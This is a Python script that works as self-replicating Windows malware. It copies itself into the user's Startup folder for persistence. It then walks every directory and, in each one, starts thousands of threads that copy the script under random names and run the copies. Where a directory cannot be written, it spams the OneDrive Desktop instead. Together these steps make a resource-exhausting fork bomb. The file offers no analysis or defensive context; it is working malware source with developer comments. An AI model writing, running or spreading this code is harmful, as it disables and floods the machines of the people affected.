import os
import random as r
import threading as T
import time
import shutil
import subprocess
import sys
import getpass


# Ver 3


global lock
lock = False


NOTI = 5000
F_ex = '.py'
cmd = 'python'


def tags(): #Works
    tag = ''.join(str(r.randint(0, 9)) for _ in range(8))
    return tag




def create_1(dst, name): #Prior i did not add .py/.exe and the wrong file (.txt) was being searched for
    shutil.copy(__file__, f"{dst}/{name}{F_ex}")
    T.Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex)).start()




def create_2(dst, name):
    shutil.copy(__file__, f"{dst}/{name}{F_ex}")
    T.Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex)).start()




def create_file3(dst, name): # Diff name, should exc when dir not avaiable. (F)
    if dst == 'F':
        shutil.copy(__file__, f"{name}{F_ex}")
        T.Thread(target=ShutilExecute, args=(cmd, '', name, F_ex)).start()




def create_file4(dst, name): # Diff name, should exc when dir not avaiable. (F)
    if dst == 'F':
        shutil.copy(__file__, f"{name}{F_ex}")
        T.Thread(target=ShutilExecute, args=(cmd, '', name, F_ex)).start()




def add_to_startup():
    user = getpass.getuser()
    startup_folder = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    script_path = os.path.abspath(sys.argv[0])
    shutil.copy(script_path, startup_folder)








def file_run(dst, name):
    #Should use any extra time to run another file.
    #LINKED to one, so every stack gets its own extra.
    T.Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex), daemon=False).start()






def intilize():
    user = getpass.getuser()
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    if script_path.startswith(startup_folder):
        # Already in startup folder, do nothing
        pass
    else:
        # Add script to startup folder
        try:
            add_to_startup()
        except:
            time.sleep(0.5)






def search():
    Dir = []




    for root, dirs, files in os.walk("./", topdown=False):
        for name in files:
            Dir.append(os.path.join(root, name))
        for name in dirs:
            Dir.append(os.path.join(root, name))
    return Dir






def ShutilExecute(cmd, dst, name, exentension):


    if lock is False:
        try:
            subprocess.run([f'{cmd}', f"{dst}/{name}{exentension}"], shell=True)
        except:
            print("FILE ACCESS EITHER NOT ACHIEVED OR ERROR IN LOCATING FILE STOPPING PROCESS.")
            lock = True
    else:
        pass






def main(Dir):
    intilize()
    CUSTOMTAG = f"FILE{tags()}" #Tag for only num 1, allows threading for second file.




    for item in Dir:
        if os.path.isdir(item):
            if os.access(item, os.R_OK):
                print(f'\x1b[6;30;42m' + f'DIR {item} ACESSED!' + '\x1b[0m') #For testing purposes
                try:
                    for _ in range(NOTI):
                        T.Thread(target=create_1, args=(item, CUSTOMTAG), daemon=True).start()
                        T.Thread(target=file_run, args=(item, CUSTOMTAG), daemon=True).start()
                        T.Thread(target=create_2, args=(item, f"FILE{tags()}"), daemon=True).start()




                except:
                    for _ in range(NOTI):
                        T.Thread(target=create_file3, args=("F", f"FILE{tags()}"), daemon=True).start()
                        T.Thread(target=file_run, args=(item, CUSTOMTAG), daemon=True).start()
                        T.Thread(target=create_file4, args=("F", f"FILE{tags()}"), daemon=True).start()




            else:
                print(f'\x1b[6;30;42m' + f'DIR {item} FAILED (CANNOT EDIT)!' + '\x1b[0m')
                for _ in range(NOTI):
                    try:
                      T.Thread(target=create_1, args=(f"c:/Users/{getpass.getuser()}/OneDrive/Desktop", CUSTOMTAG), daemon=True).start() #If no dir was found it will spam your desktop.
                      T.Thread(target=file_run, args=(f"c:/Users/{getpass.getuser()}/OneDrive/Desktop", CUSTOMTAG), daemon=True).start()          




                    except:
                       T.Thread(target=create_file3, args=("F", f"FILE{tags()}"), daemon=True).start()
                       T.Thread(target=create_file4, args=("F", f"FILE{tags()}"), daemon=True).start()


        else:
            print(f'\x1b[6;30;42m' + f'DIR {item} FAILED (NOT DIR) !' + '\x1b[0m')
            T.Thread(target=create_file3, args=("F", f"FILE{tags()}"), daemon=True).start()
            T.Thread(target=create_file4, args=("F", f"FILE{tags()}"), daemon=True).start()




if __name__ == "__main__":
    main(search())


